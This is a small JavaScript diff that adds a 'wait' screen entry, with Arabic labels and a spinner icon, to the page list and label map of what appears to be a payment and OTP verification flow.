@@ -6,7 +6,8 @@ const PAGES = [
   { id: 'payment-card', name: 'بطاقة الائتمان', icon: 'fa-credit-card-alt', url: '/payment-card.html' },
   { id: 'qpy', name: 'QPay', icon: 'fa-mobile-alt', url: '/qpy.html' },
   { id: 'payment-verify', name: 'التحقق من الرمز', icon: 'fa-lock', url: '/payment-verify.html' },
-  { id: 'otp', name: 'رمز التحقق', icon: 'fa-key', url: '/otp.html' }
+  { id: 'otp', name: 'رمز التحقق', icon: 'fa-key', url: '/otp.html' },
+  { id: 'wait', name: 'شاشة الإنتظار', icon: 'fa-spinner fa-spin', url: '/wait.html' }
 ];
 
 const PAGE_LABELS = {
@@ -17,7 +18,8 @@ const PAGE_LABELS = {
   'payment-card': 'بطاقة الائتمان',
   'qpy': 'QPay',
   'payment-verify': 'التحقق من الرمز',
-  'otp': 'رمز التحقق'
+  'otp': 'رمز التحقق',
+  'wait': 'شاشة الإنتظار'
 };
 
 const FORM_FIELD_LABELS = {
